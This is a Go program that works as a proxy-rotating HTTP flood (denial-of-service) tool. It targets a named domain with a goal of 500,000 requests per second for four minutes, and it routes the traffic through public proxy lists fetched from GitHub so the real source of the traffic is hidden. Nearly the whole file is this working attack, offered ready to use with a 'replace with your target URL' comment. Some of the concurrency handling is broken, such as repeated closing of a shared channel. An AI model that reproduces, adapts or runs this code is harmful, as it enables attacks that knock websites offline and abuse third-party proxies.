package main

import (
	"bufio"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Configuration
const (
	targetURL          = "http://scam.vn" // Replace with your target URL
	durationSeconds    = 240
	requestsPerSecond  = 500000
	proxyFetchInterval = 5 * time.Minute // Fetch proxies periodically
)

var (
	proxySources = []string{
		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
		"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
		// Add more proxy source URLs here
	}
	proxies      []string
	mu           sync.RWMutex
	stopFlag     = make(chan struct{})
	requestsSent int64
)

func fetchProxies() {
	fmt.Println("Fetching proxies...")

	newProxies := make(map[string]bool)
	var wg sync.WaitGroup

	for _, sourceURL := range proxySources {
		wg.Add(1)
		go func(urlStr string) {
			defer wg.Done()
			resp, err := http.Get(urlStr)
			if err != nil {
				fmt.Printf("Error fetching proxies from %s: %v\n", urlStr, err)
				return
			}
			defer resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				scanner := bufio.NewScanner(resp.Body)
				for scanner.Scan() {
					proxy := strings.TrimSpace(scanner.Text())
					if isValidProxy(proxy) {
						newProxies[proxy] = true
					}
				}
				if err := scanner.Err(); err != nil {
					fmt.Printf("Error reading proxies from %s: %v\n", urlStr, err)
				}
			} else {
				fmt.Printf("Failed to fetch proxies from %s, status code: %d\n", urlStr, resp.StatusCode)
			}
		}(sourceURL)
	}
	wg.Wait()

	mu.Lock()
	proxies = make([]string, 0, len(newProxies))
	for p := range newProxies {
		proxies = append(proxies, p)
	}
	mu.Unlock()

	fmt.Printf("Fetched %d valid HTTP proxies.\n", len(proxies))
	if len(proxies) == 0 {
		fmt.Println("No valid proxies found! Exiting...")
		os.Exit(1)
	}
}

// Validate proxy format (ip:port)
func isValidProxy(proxy string) bool {
	if !strings.Contains(proxy, ":") {
		return false
	}
	parts := strings.Split(proxy, ":")
	if len(parts) != 2 {
		return false
	}
	return true
}

// Send request using an HTTP proxy
func sendRequestWithProxy(urlStr string, proxyURLStr string, wg *sync.WaitGroup) {
	defer wg.Done()

	proxyURL, err := url.Parse("http://" + proxyURLStr) // Ensure it's an HTTP proxy
	if err != nil {
		fmt.Printf("Invalid proxy format: %s, Error: %v\n", proxyURLStr, err)
		close(stopFlag)
		return
	}

	transport := &http.Transport{
		Proxy: http.ProxyURL(proxyURL),
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second, // Adjust timeout
	}

	resp, err := client.Get(urlStr)
	if err != nil {
		fmt.Printf("Error sending request via proxy %s: %v\n", proxyURLStr, err)
		close(stopFlag)
		return
	}
	defer resp.Body.Close()

	fmt.Printf("Response [%d] from %s via proxy %s\n", resp.StatusCode, urlStr, proxyURLStr)
	atomic.AddInt64(&requestsSent, 1)
}

func main() {
	duration := time.Duration(durationSeconds) * time.Second
	totalRequests := int64(requestsPerSecond * durationSeconds)

	// Fetch proxies initially
	fetchProxies()

	// Start a proxy refresher in the background
	go func() {
		ticker := time.NewTicker(proxyFetchInterval)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				fetchProxies()
			case <-stopFlag:
				return
			}
		}
	}()

	startTime := time.Now()
	endTime := startTime.Add(duration)
	var wg sync.WaitGroup

	fmt.Printf("Sending up to %d requests to %s over %s using fetched proxies...\n", totalRequests, targetURL, duration)

	concurrency := 10000 // Adjust for optimal performance

	for time.Now().Before(endTime) && atomic.LoadInt64(&requestsSent) < totalRequests {
		mu.RLock()
		numProxies := len(proxies)
		mu.RUnlock()

		if numProxies > 0 {
			for i := 0; i < concurrency && atomic.LoadInt64(&requestsSent) < totalRequests; i++ {
				mu.RLock()
				proxyIndex := atomic.LoadInt64(&requestsSent) % int64(numProxies)
				proxyURL := proxies[proxyIndex]
				mu.RUnlock()

				wg.Add(1)
				go sendRequestWithProxy(targetURL, proxyURL, &wg)
			}
			time.Sleep(1 * time.Millisecond) // Minimize delay for high RPS
		} else {
			fmt.Println("No proxies available. Retrying in 5s...")
			time.Sleep(5 * time.Second)
		}
	}

	fmt.Println("Waiting for all requests to complete...")
	wg.Wait()

	elapsedTime := time.Since(startTime)
	actualRPS := float64(atomic.LoadInt64(&requestsSent)) / elapsedTime.Seconds()

	fmt.Printf("\nFinished sending requests in %s\n", elapsedTime)
	fmt.Printf("Total requests sent (approximate): %d\n", atomic.LoadInt64(&requestsSent))
	fmt.Printf("Achieved RPS (approximate): %.2f\n", actualRPS)
}
